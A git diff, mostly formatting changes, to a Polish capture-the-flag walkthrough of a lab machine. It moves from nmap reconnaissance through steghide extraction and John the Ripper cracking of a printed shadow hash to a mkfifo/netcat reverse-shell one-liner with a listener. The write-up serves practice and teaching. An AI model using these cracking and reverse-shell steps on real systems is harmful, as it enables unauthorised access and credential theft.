@@ -3,9 +3,12 @@ IP=10.10.108.33
 
 ## Rekonesans
 Przeprowadzamy wstępny skan za pomocą narzędzia nmap:
-```sh
-sudo nmap -p- 10.10.108.33
+
 ```
+sudo nmap -p- 10.10.108.33
+
+```
+
 ```
 Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-26 04:19 EDT
 Nmap scan report for 10.10.108.33
@@ -44,10 +47,13 @@ PORT    STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 96.76 seconds
 ```
+
 Po zidentyfikowaniu otwartych portów przeprowadzamy bardziej szczegółowy skan:
-```sh
+
+```
 sudo nmap -p 21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -sV -sC 10.10.108.33
 ```
+
 Porty 80 (HTTP), 21 (FTP) oraz 22 (SSH) są najważniejsze ze względu na potencjalne zagrożenia bezpieczeństwa.
 
 ```
@@ -91,36 +97,48 @@ Na porcie 113 można znaleźć interesujący link:
 ## Skanowanie
 
 ### Port 113
+
 Rozpoczynamy od sprawdzenia portu 113. Pobieramy plik za pomocą narzędzia wget:
+
 ```
 wget http://10.10.108.33/key_rev_key
 ```
 
 Pobrany plik key_rev_key jest plikiem binarnym. Warto spróbować wydobyć z niego informacje za pomocą komendy strings:
+
 ```
 strings key_rev_key | less
+
 ```
 Wynik:
+
 ```
  congratulations you have found the key:   
 b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
+
 ```
 ### Port 21
+
 Nmap wykazał, że logowanie anonimowe do serwisu FTP jest możliwe oraz znajduje się tam plik w formacie jpg:
+
 ```
 21/tcp  open  ftp         vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
 ```
+
 Logujemy się do serwisu FTP i pobieramy plik:
 
 ![FTP](img/FTP.JPG)
 
+
 Sprawdzamy, czy plik nie zawiera ukrytych danych:
+
 ```
 └─$ steghide extract -sf gum_room.jpg
 Enter passphrase: 
 wrote extracted data to "b64.txt".
+
 ```
 Udało się wydobyć ukryte dane, które zostały zapisane do pliku b64.txt:
 
@@ -135,13 +153,19 @@ Odkodowany tekst to plik /shadow używany w systemie Linux. Hasło użytkownika 
 ```
 charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
 ```
+
 Tworzymy plik tekstowy hash.txt z powyższym hashem:
+
 ```
 $6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/
+
 ```
+
 Następnie próbujemy złamać hash przy użyciu narzędzia John the Ripper:
+
 ```
 john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
 ```
 Po krótkiej chwili udaje się złamać hash:
 
@@ -172,10 +196,13 @@ Po zalogowaniu uzyskujemy dostęp do panelu, który pozwala na wykonywanie dowol
 ## Eksploitacja
 
 Spróbujemy uzyskać dostęp do systemu poprzez reverse shell, używając następującej komendy:
+
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP] [Port] >/tmp/f
 ```
+
 Następnie nasłuchujemy połączeń za pomocą narzędzia netcat:
+
 ```
 nc -lvnp [Port]
 ```
